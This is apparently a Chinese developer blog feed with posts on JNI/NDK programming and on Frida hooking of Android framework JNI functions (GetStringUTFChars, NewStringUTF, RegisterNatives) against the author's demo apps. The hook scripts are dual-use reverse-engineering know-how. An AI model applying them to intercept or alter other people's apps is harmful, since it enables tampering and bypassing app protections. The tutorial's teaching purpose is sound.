<h3 id="非Static属性"><a href="#非Static属性" class="headerlink" title="非Static属性"></a>非Static属性</h3><img src="/2023/10/13/JNI%E6%96%B0%E5%BB%BA%E5%AF%B9%E8%B1%A1%E5%92%8C%E8%AE%BF%E9%97%AEJava%E4%B8%AD%E5%B1%9E%E6%80%A7/image-20231013215030981.png" class="" title="image-20231013215030981">

<blockquote>
<p>这里新版编译器有可能报错，但是不影响编译执行</p>
</blockquote>
<h4 id="获取-amp-设置非静态私有属性"><a href="#获取-amp-设置非静态私有属性" class="headerlink" title="获取&amp;设置非静态私有属性"></a>获取&amp;设置非静态私有属性</h4><ul>
<li>设置非静态私有类属性接口</li>
</ul>
<pre><code class="C++">    void SetObjectField(jobject obj, jfieldID fieldID, jobject value)
    { functions-&gt;SetObjectField(this, obj, fieldID, value); }
    void SetBooleanField(jobject obj, jfieldID fieldID, jboolean value)
    { functions-&gt;SetBooleanField(this, obj, fieldID, value); }
    void SetByteField(jobject obj, jfieldID fieldID, jbyte value)
    { functions-&gt;SetByteField(this, obj, fieldID, value); }
    void SetCharField(jobject obj, jfieldID fieldID, jchar value)
    { functions-&gt;SetCharField(this, obj, fieldID, value); }
    void SetShortField(jobject obj, jfieldID fieldID, jshort value)
    { functions-&gt;SetShortField(this, obj, fieldID, value); }
    void SetIntField(jobject obj, jfieldID fieldID, jint value)
    { functions-&gt;SetIntField(this, obj, fieldID, value); }
    void SetLongField(jobject obj, jfieldID fieldID, jlong value)
    { functions-&gt;SetLongField(this, obj, fieldID, value); }
    void SetFloatField(jobject obj, jfieldID fieldID, jfloat value)
    { functions-&gt;SetFloatField(this, obj, fieldID, value); }
    void SetDoubleField(jobject obj, jfieldID fieldID, jdouble value)
    { functions-&gt;SetDoubleField(this, obj, fieldID, value); }
</code></pre>
<ul>
<li>设置非静态私有属性和数组类型</li>
</ul>
<pre><code class="C++">extern "C"
JNIEXPORT void JNICALL
Java_com_xiaoeryu_reflectiontest_MainActivity_getNonStaticField(JNIEnv *env, jobject thiz, jobject testobj) {
    // private String privateField = "i am a private Field";
    jclass TestJclass = env-&gt;FindClass("com/xiaoeryu/reflectiontest/Test");
    jfieldID privateField_fid = env-&gt;GetFieldID(TestJclass, "privateField", "Ljava/lang/String;");
    //    jobject GetObjectField(jobject obj, jfieldID fieldID)
    jstring privateField_obj = static_cast&lt;jstring&gt;(env-&gt;GetObjectField(testobj, privateField_fid));

//    const char *priviteField_content = env-&gt;GetStringUTFChars(privateField_obj, nullptr);
//    __android_log_print(4, "xiaoeryu-&gt;jni", "privateField_obj_jni-&gt;%s", priviteField_content);

    // 修改private String
    jstring newString = env-&gt;NewStringUTF("Modified by jni");
    env-&gt;SetObjectField(testobj, privateField_fid, newString);

    privateField_obj = static_cast&lt;jstring&gt;(env-&gt;GetObjectField(testobj, privateField_fid));

    const char *priviteField_content = env-&gt;GetStringUTFChars(privateField_obj, nullptr);
    __android_log_print(4, "xiaoeryu-&gt;jni", "privateField_obj_jni-&gt;%s", priviteField_content);

    // GetIntField
    // private int privateField_int = 100;
    jfieldID privateField_int_fid = env-&gt;GetFieldID(TestJclass, "privateField_int", "I");
    jint privateField_int_value = env-&gt;GetIntField(testobj, privateField_int_fid);

    __android_log_print(4, "xiaoeryu-&gt;jni", "prinvateField_int_value_jni-&gt;%d", privateField_int_value);

    // SetIntField
    env-&gt;SetIntField(testobj, privateField_int_fid, 200);
    jint privateField_int_setValue = env-&gt;GetIntField(testobj, privateField_int_fid);

    __android_log_print(4, "xiaoeryu-&gt;jni", "privateField_int_vale_jni-&gt;%d", privateField_int_setValue);

    // 数组
    // public int[] intarray = null;
    jfieldID intarray_fid = env-&gt;GetFieldID(TestJclass, "intarray", "[I");
    jintArray intarray_obj = static_cast&lt;jintArray&gt;(env-&gt;GetObjectField(testobj, intarray_fid));

    int arrayLenght = env-&gt;GetArrayLength(intarray_obj);

    __android_log_print(4, "xiaoeryu-&gt;jni", "arrayLenght_jni-&gt;%d", arrayLenght);

    int* array = env-&gt;GetIntArrayElements(intarray_obj, nullptr);
    for (int i = 0; i &lt; arrayLenght; ++i) {
        __android_log_print(4, "xiaoeryu-&gt;jni", "array[%d]-&gt;%d", i, array[i]);
    }
    // setArray
    jint jni_array[arrayLenght];
    for (int j = 0; j &lt; arrayLenght; ++j) {
        jni_array[j] = arrayLenght - j;
    }
    const jint* ptr = jni_array;
    //     void SetIntArrayRegion(jintArray array, jsize start, jsize len,
    //        const jint* buf)
    env-&gt;SetIntArrayRegion(intarray_obj, 0, arrayLenght, ptr);

    int* array_set = env-&gt;GetIntArrayElements(intarray_obj, nullptr);
    for (int i = 0; i &lt; arrayLenght; ++i) {
        __android_log_print(4, "xiaoeryu-&gt;jni", "array_set[%d]-&gt;%d", i, array_set[i]);
    }
}
</code></pre>
<p>访问数组的操作方法</p>
<img src="/2023/10/13/JNI%E6%96%B0%E5%BB%BA%E5%AF%B9%E8%B1%A1%E5%92%8C%E8%AE%BF%E9%97%AEJava%E4%B8%AD%E5%B1%9E%E6%80%A7/image-20231013223718644.png" class="" title="image-20231013223718644">

<p><a href="https://github.com/xiaoeeyu/JNICreateJavaObj_AccessClassObj">代码地址</a></p>
]]></content>
      <categories>
        <category>NDK开发</category>
      </categories>
      <tags>
        <tag>JNI对象创建</tag>
        <tag>访问java类中的属性</tag>
      </tags>
  </entry>
  <entry>
    <title>JNIHook</title>
    <url>/2024/03/24/JNI%E6%A1%86%E6%9E%B6%E5%B1%82Hook/</url>
    <content><![CDATA[<ul>
<li>JNI函数符号hook</li>
<li>JNI函数参数、返回值打印和替换</li>
<li>动态注册JNI_OnLoad</li>
<li>hook RegisterNatives</li>
<li>jnitrace</li>
</ul>
<p>本章对系统框架层的函数进行了hook、以及hook Registernatives获取其中的信息</p>
<p>Frida相对于Xposed的优势在于可以对Native层进行hook、对内存进行搜索</p>
<p>除了对用户层native代码进行hook之外也可以对系统框架层进行hook，而对更深层进行hook有时候可以更容易得到需要的信息。</p>
<p>jnitrace脚本是hook了所有的JNI函数，app经过了JNI的任何函数都可以打印出操作流程。</p>
<p>这里还是以之前写的demo中的JNI函数为例</p>
<img src="/2024/03/24/JNI%E6%A1%86%E6%9E%B6%E5%B1%82Hook/image-20240323111033560.png" class="" title="image-20240323111033560">

<ul>
<li>例如这里hook <em>env-&gt;GetStringUTFChars</em></li>
<li>要hook这个函数还是首先要找到它的地址，查找函数的地址可以用上一章的方法从导出表或者导出符号中找到函数地址，但是首先要知道这个函数在哪个so中，如果对源码不熟悉不确定在哪个so中的话可以上网搜索一下这个函数所在的so</li>
</ul>
<h4 id="hook-env-gt-GetStringUTFChars"><a href="#hook-env-gt-GetStringUTFChars" class="headerlink" title="hook env->GetStringUTFChars"></a>hook env-&gt;GetStringUTFChars</h4><h5 id="获取函数地址"><a href="#获取函数地址" class="headerlink" title="获取函数地址"></a>获取函数地址</h5><pre><code class="js">function hook_JNI() {
    Java.perform(function() {
        var GetStringUTFChars_addr = null;
        var symbols = Module.enumerateSymbols("libart.so");

        symbols.forEach(function(symbol) {
            // 排除包含 "CheckJNI" 的符号，并且包含 "JNI" 的符号
            if (symbol.name.includes("JNI") &amp;&amp; !symbol.name.includes("CheckJNI")) {
                // 查找包含 "GetStringUTFChars" 的符号
                if (symbol.name.includes("GetStringUTFChars")) {
                    console.log("GetStringUTFChars: " + symbol.name);
                    GetStringUTFChars_addr = symbol.address;
                }
            }
        });
    });
}
</code></pre>
<ul>
<li><p>因为这个so库中有两个<em>GetStringUTFChars</em>，需要把<em>CheckJNI</em>给筛选掉。最后得到的结果是：**_ZN3art3JNI17GetStringUTFCharsEP7_JNIEnvP8_jstringPh**</p>
</li>
<li><p>对这个结果进行<a href="http://demangler.com/">demangler</a>可以看到获取到完整的函数名：<em><em>art::JNI::GetStringUTFChars(_JNIEnv</em>, _jstring</em>, unsigned char*)**</p>
</li>
<li><p>使用attach对它进行hook就可以获取到所有调用这个函数的参数和返回值了</p>
</li>
</ul>
<pre><code class="js">function hook_JNI() {
    Java.perform(function () {
        var GetStringUTFChars_addr = null;
        var symbols = Module.enumerateSymbols("libart.so");

        symbols.forEach(function (symbol) {
            // 排除包含 "CheckJNI" 的符号，并且包含 "JNI" 的符号
            if (symbol.name.includes("JNI") &amp;&amp; !symbol.name.includes("CheckJNI")) {
                // 查找包含 "GetStringUTFChars" 的符号
                if (symbol.name.includes("GetStringUTFChars")) {
                    console.log("GetStringUTFChars: " + symbol.name);
                    GetStringUTFChars_addr = symbol.address;
                }
            }
        });
        Interceptor.attach(GetStringUTFChars_addr, {
            onEnter: function (args) {
                console.log("art::JNI::GetStringUTFChars(_JNIEnv*, _jstring*, unsigned char*)=&gt; " + args[0], Java.vm.getEnv().getStringUtfChars(args[1], null).readCString(), args[2]);
                // console.log('CCCryptorCreate called from:\n' +
                //     Thread.backtrace(this.context, Backtracer.ACCURATE)
                //         .map(DebugSymbol.fromAddress).join('\n') + '\n');
            },
            onLeave: function (retval) {
                console.log("GetStringUTFChars retval: " + retval.readCString());
            }
        })
    });
}
</code></pre>
<h5 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h5><img src="/2024/03/24/JNI%E6%A1%86%E6%9E%B6%E5%B1%82Hook/image-20240323200640655.png" class="" title="image-20240323200640655">

<ul>
<li>参数和返回值总共变了三次，说明这个函数也被调用了三次</li>
<li>尝试了打印调用栈，不过调用栈打印的结果不太准确</li>
</ul>
<h4 id="hook-env-gt-NewStringUTF"><a href="#hook-env-gt-NewStringUTF" class="headerlink" title="hook env->NewStringUTF"></a>hook env-&gt;NewStringUTF</h4><p>替换env-&gt;NewStringUTF()的参数和返回值，流程跟刚才差不多区别在于这里是一个带参数的函数，尝试替换它的参数看返回值是否被改变</p>
<pre><code class="js">function replace_JNI() {
    Java.perform(function () {
        var NewStringUTF_addr = null;
        var symbols = Module.enumerateSymbols("libart.so");

        symbols.forEach(function (symbol) {
            // 排除包含 "CheckJNI" 的符号，并且包含 "JNI" 的符号
            if (symbol.name.includes("JNI") &amp;&amp; !symbol.name.includes("CheckJNI")) {
                // 查找包含 "NewStringUTF" 的符号
                if (symbol.name.includes("NewStringUTF")) {
                    console.log("NewStringUTF name: " + symbol.name);
                    NewStringUTF_addr = symbol.address;
                }
            }
        });

        // 定义原始 NewStringUTF 函数
        var original_NewStringUTF = new NativeFunction(NewStringUTF_addr, "pointer", ["pointer", "pointer"]);

        // 替换原始 NewStringUTF 函数
        Interceptor.replace(NewStringUTF_addr, new NativeCallback(function (env, str) {
            console.log("NewStringUTF args: ", env, str.readCString());
            
            // 调用原始 NewStringUTF 函数
            var original_result = original_NewStringUTF(env, Memory.allocUtf8String("hooked_NewStringUTF"));
            console.log("NewStringUTF result: ", original_result);

            // 创建新的字符串并返回
            var newStr = Memory.allocUtf8String("hooked_NewStringUTF");
            var newRet = original_NewStringUTF(env, newStr);
            return newRet;
        }, "pointer", ["pointer", "pointer"]));
    });
}
</code></pre>
<h5 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h5><img src="/2024/03/24/JNI%E6%A1%86%E6%9E%B6%E5%B1%82Hook/image-20240323205323112.png" class="" title="image-20240323205323112">

<ul>
<li>hook脚本执行后，NewStringUTF()的值就被替换为了脚本中传入的值</li>
</ul>
<h4 id="hook动态绑定的RegisterNatives"><a href="#hook动态绑定的RegisterNatives" class="headerlink" title="hook动态绑定的RegisterNatives"></a>hook动态绑定的RegisterNatives</h4><img src="/2024/03/24/JNI%E6%A1%86%E6%9E%B6%E5%B1%82Hook/image-20240323210435046.png" class="" title="image-20240323210435046">

<pre><code class="js">function hook_RegisterNatives() {
    Java.perform(function () {
        var RegisterNatives_addr = null;  // 初始化 RegisterNatives 函数的地址变量
        var symbols = Module.enumerateSymbols("libart.so");  // 枚举 libart.so 中的所有符号

        symbols.forEach(function (symbol) {  // 遍历所有的符号
            // 排除包含 "CheckJNI" 的符号，并且包含 "JNI" 的符号
            if (symbol.name.includes("JNI") &amp;&amp; !symbol.name.includes("CheckJNI")) {
                // 查找包含 "RegisterNatives" 的符号
                if (symbol.name.includes("RegisterNatives")) {
                    console.log("RegisterNatives name: " + symbol.name);  // 打印找到的 RegisterNatives 函数名
                    RegisterNatives_addr = symbol.address;  // 将找到的 RegisterNatives 函数地址赋给 RegisterNatives_addr 变量
                }
            }
        });

        if (RegisterNatives_addr != null) {  // 如果 RegisterNatives 函数地址不为 null
            // 在 RegisterNatives 函数上创建一个 Interceptor
            Interceptor.attach(RegisterNatives_addr, {
                onEnter: function (args) {  // 进入函数时的回调
                    console.log("RegisterNative method counts =&gt; ", args[3]);  // 打印注册的方法数量
                    var env = args[0];  // 获取 JNIEnv 指针
                    var clazz = args[1];  // 获取 jclass 对象
                    var class_name = Java.vm.getEnv().getClassName(clazz);  // 获取类名
                    var methods_ptr = ptr(args[2]);  // 获取方法数组指针
                    var method_count = args[3].toInt32();  // 将方法数量转换为整数

                    // 遍历方法数组
                    for (var i = 0; i &lt; method_count; i++) {
                        // 获取方法名、方法签名和函数指针
                        var name_ptr = methods_ptr.add(i * Process.pointerSize * 3).readPointer();
                        var sig_ptr = methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize).readPointer();
                        var fnPtr_ptr = methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize * 2).readPointer();

                        // 查找函数指针所在的模块
                        var find_module = Process.findModuleByAddress(fnPtr_ptr);

                        // 打印注册的方法信息
                        console.log("RegisterNative class_name =&gt; ", class_name);
                        console.log("RegisterNative name =&gt; ", Memory.readCString(name_ptr));
                        console.log("RegisterNative sig =&gt; ", Memory.readCString(sig_ptr));
                        console.log("RegisterNative fnPtr_ptr =&gt; ", JSON.stringify(DebugSymbol.fromAddress(fnPtr_ptr)));
                        console.log("RegisterNative find_module =&gt; ", JSON.stringify(find_module));
                        console.log("callee =&gt; ", DebugSymbol.fromAddress(this.returnAddress));
                        console.log("offset =&gt; ", ptr(fnPtr_ptr).sub(find_module.base));
                    }
                },
                onLeave: function () { }  // 离开函数时的回调
            });
        } else {
            console.log("RegisterNatives_addr is null");  // 如果 RegisterNatives 函数地址为 null，则打印提示信息
        }
    });
}
</code></pre>
<ul>
<li>这段稍微长一点，分为两个部分，第一部分还是获取*RegisterNatives()*的地址，第二部分对其中的参数进行解析</li>
</ul>
<img src="/2024/03/24/JNI%E6%A1%86%E6%9E%B6%E5%B1%82Hook/image-20240324103737110.png" class="" title="image-20240324103737110">

<ul>
<li>可以解析出来的内容包括：类名、注册前的函数名、sig、注册函数在内存中的信息、所在模块的信息、 RegisterNative()的返回地址和所在库名以及在库中的偏移、最后还获取了一下注册函数所在的偏移（其实已经知道了函数地址和库的基址已经可以直接算出来了）</li>
</ul>
<h6 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h6><p>使用的被hook demo还是上一章中使用的<a href="https://github.com/xiaoeeyu/demoso1">demo</a></p>
<p>本章完整的<a href="https://github.com/xiaoeeyu/JNI-hook/blob/main/JNI_hook.js">hook脚本</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
        <tag>框架层Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaVM与JNIEnv</title>
    <url>/2023/10/12/JavaVM%E4%B8%8EJNIEnv/</url>
    <content><![CDATA[<p>上一章简单测试了一下Java的反射，这章我们来测试一下JavaVM和JNIEnv</p>
<span id="more"></span>

<h2 id="回顾一下Java反射"><a href="#回顾一下Java反射" class="headerlink" title="回顾一下Java反射"></a>回顾一下Java反射</h2><img src="/2023/10/12/JavaVM%E4%B8%8EJNIEnv/image-20231012012150087.png" class="" title="image-20231012012150087">

<blockquote>
<p>在我们使用NDK访问java类中的方法的时候，流程也是差不多一样的</p>
<p>找到类名-&gt;jFieldID/jmethodID（等于是Java当中的GetField）-&gt;通过GetObjectField获取到Java类中的函数或值</p>
</blockquote>
<p>在调用函数的时候也要注意，如果类中没有同名函数可以不用传递参数。如果存在同名函数就需要将参数一并传递</p>
<img src="/2023/10/12/JavaVM%E4%B8%8EJNIEnv/image-20231012013953259.png" class="" title="image-20231012013953259">

<p>函数描述符</p>
<img src="/2023/10/12/JavaVM%E4%B8%8EJNIEnv/image-20231012014049408.png" class="" title="image-20231012014049408">

<h2 id="JavaVM和JNIEnv"><a href="#JavaVM和JNIEnv" class="headerlink" title="JavaVM和JNIEnv"></a>JavaVM和JNIEnv</h2><img src="/2023/10/12/JavaVM%E4%B8%8EJNIEnv/image-20231012014219741.png" class="" title="image-20231012014219741">

<blockquote>
<p>JavaVM结构体里面包含了5个方法</p>
</blockquote>
<img src="/2023/10/12/JavaVM%E4%B8%8EJNIEnv/image-20231012014321768.png" class="" title="image-20231012014321768">

<blockquote>
<p>JNIEnv结构体里面包含了非常多的方法可以调用</p>
</blockquote>
<img src="/2023/10/12/JavaVM%E4%B8%8EJNIEnv/image-20231012015307574.png" class="" title="image-20231012015307574">

<img src="/2023/10/12/JavaVM%E4%B8%8EJNIEnv/image-20231012015313275.png" class="" title="image-20231012015313275">

<h3 id="怎么获取JavaVM和JNIEnv"><a href="#怎么获取JavaVM和JNIEnv" class="headerlink" title="怎么获取JavaVM和JNIEnv"></a>怎么获取JavaVM和JNIEnv</h3><img src="/2023/10/12/JavaVM%E4%B8%8EJNIEnv/image-20231012015340930.png" class="" title="image-20231012015340930">

<img src="/2023/10/12/JavaVM%E4%B8%8EJNIEnv/image-20231012015343790.png" class="" title="image-20231012015343790">

<h4 id="第一种方法：在JNI-OnLoad中获取"><a href="#第一种方法：在JNI-OnLoad中获取" class="headerlink" title="第一种方法：在JNI_OnLoad中获取"></a>第一种方法：在JNI_OnLoad中获取</h4><pre><code class="C++">    globalVM = vm;
    __android_log_print(4, "xiaoeryu-&gt;jni", "JNI_OnLoad(JavaVM* vm, void* reserved)-&gt;%p", vm);

    __android_log_print(4, "xiaoeryu-&gt;jni", "jni-&gt;%s", "JNI_OnLoad is called");
    jint result = 0;

    JNIEnv *env = nullptr;
    if (vm-&gt;GetEnv((void **)&amp;env, JNI_VERSION_1_6) == JNI_OK){
        __android_log_print(4, "xiaoeryu-&gt;jni", "jni-&gt;%s", "vm-&gt;GetEnv((void **)&amp;env, JNI_VERSION_1_6) success");
    }
    __android_log_print(4, "xiaoeryu-&gt;jni", "GetEnv((void **)&amp;env, JNI_VERSION_1_6)-&gt;%p", env);
</code></pre>
<h4 id="第二种方法：通过JNI函数的传参获取"><a href="#第二种方法：通过JNI函数的传参获取" class="headerlink" title="第二种方法：通过JNI函数的传参获取"></a>第二种方法：通过JNI函数的传参获取</h4><img src="/2023/10/12/JavaVM%E4%B8%8EJNIEnv/image-20231012020427432.png" class="" title="image-20231012020427432">

<h4 id="第三种方法：在子线程中获取"><a href="#第三种方法：在子线程中获取" class="headerlink" title="第三种方法：在子线程中获取"></a>第三种方法：在子线程中获取</h4><pre><code class="C++">    // 在子线程中调用JNIEnv的接口
    JNIEnv *threadenv = nullptr;
    globalVM-&gt;AttachCurrentThread(&amp;threadenv, nullptr);
    if (globalVM-&gt;GetEnv((void **)&amp;threadenv, JNI_VERSION_1_6) == JNI_OK){
        __android_log_print(4, "xiaoeryu-&gt;jni", "jni-&gt;%s", "(globalVM-&gt;GetEnv((void **)&amp;threadenv, JNI_VERSION_1_6) success");
        jstring jstring1 = threadenv-&gt;NewStringUTF("threadtest jstring");
        const char* content = threadenv-&gt;GetStringUTFChars(jstring1, nullptr);
        __android_log_print(4, "xiaoeryu-&gt;jni", "jni-&gt;%s", content);
        threadenv-&gt;ReleaseStringUTFChars(jstring1, content);
    } else{
        __android_log_print(4, "xiaoeryu-&gt;jni", "jni-&gt;%s", "(globalVM-&gt;GetEnv((void **)&amp;threadenv, JNI_VERSION_1_6) failed");
    }
</code></pre>
<img src="/2023/10/12/JavaVM%E4%B8%8EJNIEnv/image-20231012015348275.png" class="" title="image-20231012015348275">

<blockquote>
<p> JNIEnv是与线程相关的，每一个线程都有自己的env</p>
</blockquote>
<h2 id="native子线程无法加载app自己的Class"><a href="#native子线程无法加载app自己的Class" class="headerlink" title="native子线程无法加载app自己的Class"></a>native子线程无法加载app自己的Class</h2><p>通过pthread_create之类的方法在native层创建了子线程,则在这个子线程中FindClass方法查不到我们Apk中定义的class。会返回0并且在Java层抛出ClassNotFoundException:</p>
<blockquote>
<p>因为在子线程中使用<code>FindClass</code>方法，他将会使用与当前线程关联的类加载器进行类查找。就可能会导致子线程中无法找到在主线程中加载的类。</p>
</blockquote>
<p>通过Exception可以捕获到具体的异常</p>
<pre><code class="C++">//     jclass TestJclass = threadenv-&gt;FindClass("com/xiaoeryu/reflectiontest/Test");
//    threadenv-&gt;ExceptionDescribe();
//    threadenv-&gt;ExceptionClear();
</code></pre>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>这里使用一种通用的解决办法：</p>
<p>通过在主线程中使用<code>FindClass</code>找到类的<code>jclass</code>对象，然后将这个对象传递给子线程使用。</p>
<p><strong>举个栗子</strong></p>
<pre><code class="C++">// 在主线程中
jclass TestJclass = env-&gt;FindClass("com/xiaoeryu/reflectiontest/Test");
jobject appClassloader = env-&gt;NewGlobalRef(TestJclass);

// 在子线程中
void *threadtest(void* args){
    JNIEnv *threadenv = nullptr;
    globalVM-&gt;AttachCurrentThread(&amp;threadenv, nullptr);

    jclass TestJclass = (jclass)args; // 使用主线程中找到的类引用
    // 继续使用 TestJclass 进行其他 JNI 操作

    globalVM-&gt;DetachCurrentThread();
    pthread_exit(0);
}

// 创建子线程时传递类的引用
pthread_t thread;
pthread_create(&amp;thread, nullptr, threadtest, appClassloader);
pthread_join(thread, nullptr);

// 在主线程中删除全局引用
env-&gt;DeleteGlobalRef(appClassloader);
</code></pre>
<blockquote>
<p>当然在类外定义一个全局变量，在主类中赋值然后再子类中使用也是可以的，但是使用<code>NewGlobalRef</code> 更灵活、更方便控制。</p>
</blockquote>
<p><a href="https://github.com/xiaoeeyu/ReflectionTest_JavaVM_JNIEnv">代码地址</a></p>
]]></content>
      <categories>
        <category>NDK开发</category>
      </categories>
      <tags>
        <tag>JavaVM与JNIEnv</tag>
      </tags>
  </entry>
  <entry>
    <title>JNI访问Java类函数</title>
    <url>/2023/10/14/JNI%E8%AE%BF%E9%97%AEJava%E7%B1%BB%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>在之前demo的基础上添加几个方法，测试在JNI编程中怎么访问Java类中的函数</p>
<span id="more"></span>

<p>在JNI和Java中访问类属性有什么区别：</p>
<img src="/2023/10/14/JNI%E8%AE%BF%E9%97%AEJava%E7%B1%BB%E5%87%BD%E6%95%B0/image-20231014215619446.png" class="" title="image-20231014215619446">

<p>对以下这几种类型的函数进行访问</p>
<img src="/2023/10/14/JNI%E8%AE%BF%E9%97%AEJava%E7%B1%BB%E5%87%BD%E6%95%B0/image-20231014215714036.png" class="" title="image-20231014215714036">

<p>构造函数的访问是一个特例</p>
<img src="/2023/10/14/JNI%E8%AE%BF%E9%97%AEJava%E7%B1%BB%E5%87%BD%E6%95%B0/image-20231014215739355.png" class="" title="image-20231014215739355">

<p>在JNI中访问Java函数要加上函数描述符</p>
<img src="/2023/10/14/JNI%E8%AE%BF%E9%97%AEJava%E7%B1%BB%E5%87%BD%E6%95%B0/image-20231014215852588.png" class="" title="image-20231014215852588">

<h4 id="调用构造函数"><a href="#调用构造函数" class="headerlink" title="调用构造函数"></a>调用构造函数</h4><pre><code class="C++">extern "C"
JNIEXPORT jobject JNICALL
Java_com_xiaoeryu_reflectiontest_MainActivity_callInit(JNIEnv *env, jobject thiz) {
    // TODO: implement callInit()
    // public Test(String arg, int arg2)
    jclass TestJclass = env-&gt;FindClass("com/xiaoeryu/reflectiontest/Test");
    jmethodID con_mid = env-&gt;GetMethodID(TestJclass, "&lt;init&gt;", "(Ljava/lang/String;I)V");
    jstring arg0 = env-&gt;NewStringUTF("i am from callInit");
    jobject obj = env-&gt;NewObject(TestJclass, con_mid, arg0, 100);
    return obj;
}
</code></pre>
<blockquote>
<p>构造函数调用的时候函数名使用<init>代替</init></p>
</blockquote>
<h4 id="调用静态函数"><a href="#调用静态函数" class="headerlink" title="调用静态函数"></a>调用静态函数</h4><pre><code class="C++">extern "C"
JNIEXPORT void JNICALL
Java_com_xiaoeryu_reflectiontest_MainActivity_callStaticFunc(JNIEnv *env, jobject thiz) {
    // TODO: implement callStaticFunc()
    // public static void publicStaticFunc()
    jclass Testjclass = env-&gt;FindClass("com/xiaoeryu/reflectiontest/Test");
    jmethodID publicStaticFunc_mid = env-&gt;GetStaticMethodID(Testjclass, "publicStaticFunc", "()V");

    env-&gt;CallStaticVoidMethod(Testjclass, publicStaticFunc_mid);

    // private static void privateStaticFunc()
    jmethodID privateStaticFunc_mid = env-&gt;GetStaticMethodID(Testjclass, "privateStaticFunc",
                                                             "()V");
    env-&gt;CallStaticVoidMethod(Testjclass, privateStaticFunc_mid);

//    public static int publicStaticFunc_int(int a){
//        Log.i("xiaoeryu", "i am from publicStaticFunc_int");
//        return 111 + a;
//    }
    jmethodID publicStaticFunc_int_mid = env-&gt;GetStaticMethodID(Testjclass, "publicStaticFunc_int",
                                                                "(I)I");
    jint res_value = env-&gt;CallStaticIntMethod(Testjclass, publicStaticFunc_int_mid, 001);
    __android_log_print(4, "xiaoeryu-&gt;jni", "publicStaticFunc_int-&gt;%d", res_value);

//    public static String publicStaticFunc_string(String arg){
//        Log.i("xiaoeryu", "i am from publicStaticFunc_int");
//        return "publicStaticFunc_string-&gt;" + arg;
//    }
    jmethodID publicStaticFunc_str_mid = env-&gt;GetStaticMethodID(Testjclass,
                                                                "publicStaticFunc_string",
                                                                "(Ljava/lang/String;)Ljava/lang/String;");
    jstring arg_str = env-&gt;NewStringUTF("i am from jni");
    jstring ret_str = static_cast&lt;jstring&gt;(env-&gt;CallStaticObjectMethod(Testjclass,
                                                                       publicStaticFunc_str_mid,
                                                                       arg_str));
    const char *content = env-&gt;GetStringUTFChars(ret_str, nullptr);
    __android_log_print(4, "xiaoeryu-&gt;jni", "publicStaticFunc_string-&gt;%s", content);

}
</code></pre>
<blockquote>
<p>JNI调用java函数不分public/private</p>
<p>call的类型也分为引用类型<code>CallStaticObjectMethod</code>和基础类型<code>CallStaticVoidMethod、CallStaticIntMethod 等。。。</code></p>
</blockquote>
<h4 id="调用非静态函数"><a href="#调用非静态函数" class="headerlink" title="调用非静态函数"></a>调用非静态函数</h4><pre><code class="C++">extern "C"
JNIEXPORT void JNICALL
Java_com_xiaoeryu_reflectiontest_MainActivity_callNonStaticFunc(JNIEnv *env, jobject thiz) {
    // TODO: implement callNonStaticFunc()
    jclass TestJclass = env-&gt;FindClass("com/xiaoeryu/reflectiontest/Test");
    jmethodID con_mid = env-&gt;GetMethodID(TestJclass, "&lt;init&gt;", "(Ljava/lang/String;I)V");
    jstring arg = env-&gt;NewStringUTF("i am from callInit");
    jobject testObj = env-&gt;NewObject(TestJclass, con_mid, arg, 100);
    // public void publicFunc()
    jmethodID publicFunc_mid = env-&gt;GetMethodID(TestJclass, "publicFunc", "()V");
//    void CallVoidMethod(jobject obj, jmethodID methodID, ...)
    env-&gt;CallVoidMethod(testObj, publicFunc_mid);

    // private String  privateFunc_str(int a, String b)
    jmethodID privateFunc_str_mid = env-&gt;GetMethodID(TestJclass, "privateFunc_str", "(ILjava/lang/String;)Ljava/lang/String;");
    jstring arg1 = env-&gt;NewStringUTF("i am from jni");
    // 调用不同CallObjectMethod的区别
    // CallObjectMethod
    // CallObjectMethodA
    // CallObjectMethodV
//    jstring ret_str = static_cast&lt;jstring&gt;(env-&gt;CallObjectMethod(testObj, privateFunc_str_mid, 002,
//                                                                 arg1));
    jvalue args[2];
    args[0].i = 003;
    args[1].l = arg1;
    jstring ret_str = static_cast&lt;jstring&gt;(env-&gt;CallObjectMethodA(testObj, privateFunc_str_mid,
                                                                  args));
    const char* result_ptr = env-&gt;GetStringUTFChars(ret_str, nullptr);
    __android_log_print(4, "xiaoeryu-&gt;jni", "privateFunc_str-&gt;%s", result_ptr);

    // private int[] privateFunc_array(int a)
    jmethodID privateFunc_array_mid = env-&gt;GetMethodID(TestJclass, "privateFunc_array", "(I)[I");
    jintArray array_obj = static_cast&lt;jintArray&gt;(static_cast&lt;jarray&gt;(env-&gt;CallObjectMethod(testObj,
                                                                                           privateFunc_array_mid,
                                                                                           20)));
    jint* array_ptr = env-&gt;GetIntArrayElements(array_obj, nullptr);
    for (int i = 0; i &lt; env-&gt;GetArrayLength(array_obj); ++i) {
        __android_log_print(4, "xiaoeryu-&gt;jni", "array[%d]-&gt;%d", i, array_ptr[i]);
    }
}
</code></pre>
<blockquote>
<p>非静态函数不能直接调用，需要先使用<code>NewObject()</code>实例化之后才能调用</p>
<p>每个Call函数有三种实现：这三种接口都可以完成函数的调用，只是参数会有区别</p>
<p>​	CallXXXMethod：一般方式：处理变长参数时可能不够灵活</p>
<p>​	CallXXXMethodA：使用<code>jvalue</code>数组传递参数，可以更方便的处理变长参数</p>
<p>​	CallXXXMethodV：使用<code>va_list</code>传递参数，也是为了处理变长参数。形式更加灵活，但是需要注意正确处理参数的类型和顺序</p>
</blockquote>
<h4 id="调用父类函数"><a href="#调用父类函数" class="headerlink" title="调用父类函数"></a>调用父类函数</h4><img src="/2023/10/14/JNI%E8%AE%BF%E9%97%AEJava%E7%B1%BB%E5%87%BD%E6%95%B0/image-20231014174357510.png" class="" title="image-20231014174357510">

<blockquote>
<p>例如我们如果要把这个父类的onCreate()以及它里面的一些调用方法进行本地化写成JNI函数应该怎么做呢</p>
<p>因为它是一个入口函数所以有很多壳会这么做，接下来看一下它是怎么实现的</p>
